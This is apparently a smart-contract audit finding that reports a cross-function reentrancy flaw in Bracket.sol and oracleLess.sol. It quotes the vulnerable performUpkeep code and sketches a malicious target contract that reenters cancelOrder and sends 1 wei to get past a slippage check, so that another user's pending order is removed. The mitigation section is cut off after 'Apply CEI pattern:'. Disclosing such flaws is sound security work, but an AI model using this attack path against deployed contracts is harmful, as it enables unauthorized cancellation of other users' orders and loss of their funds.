# cross function reentrency to cause loss of funds to user by malicious `target`

### Summary

A cross-function reentrancy vulnerability exists `oracleLess.sol` and `Bracket.sol` where malicious contracts can reenter during order execution to manipulate the pending orders array.

### Root Cause

```solidity
function performUpkeep(bytes calldata performData) external override nonReentrant {
    // ... decode and setup
    
    (uint256 swapAmountOut, uint256 tokenInRefund) = execute(
        data.target,//@audit this target address is caller controlled and can be anything
        data.txData,//@audit the txData is caller controlled and can bee anything
        order.amountIn,
        order.tokenIn,
        order.tokenOut,
        bips
    );
    
    //@audit Vulnerable state change after external call
    pendingOrderIds = ArrayMutation.removeFromArray(
        data.pendingOrderIdx,
        pendingOrderIds
    );
}
```

### Attack Path

1. Create malicious `target` contract:

```solidity
contract target {
    function fallback(address from, address to, uint256 amount) external {
        //we fall back to cancel our user first and it will get cancelled normally
        Bracket(msg.sender).cancelOrder(targetOrderId);
        
        //we transfer 1 wei of token out to bracket to buypass the check of minimumAmountOut has to be > change in balance
        tokenOut.safetransfer(msg.sender, 1);
        
        //Its important to know that user can carry thins attack for no cost.
        return true;
    }
}
```

1. Malicious user create an order with max slippage (accepting 0 tokens), his index is 12 in the array 
2. array of pending orders grow to have 60 indices
3. User performUpKeep on his own order reentering   the contract at cancelOrder function to cancell his own order while sending 1 wei of token out to the contract to bypass the check at minAmountOut that checks that balance change has to be > slippage set
4. The `ArrayMutation.removeFromArray` in `performUpKeep` will instead remove another user order index
   
### Impact
If it was intended to not check for `pendingOrderIds[i] == order.orderId` in `modifyOrder` then the impact is unauthorized order cancellation only for other user

If it was a mistake not checking for `pendingOrderIds[i] == order.orderId` in `modifyOrder` (which is actually another bug) then the impact is complete loss of funds for that user that got his order index deleted

### Mitigation

Apply CEI pattern:
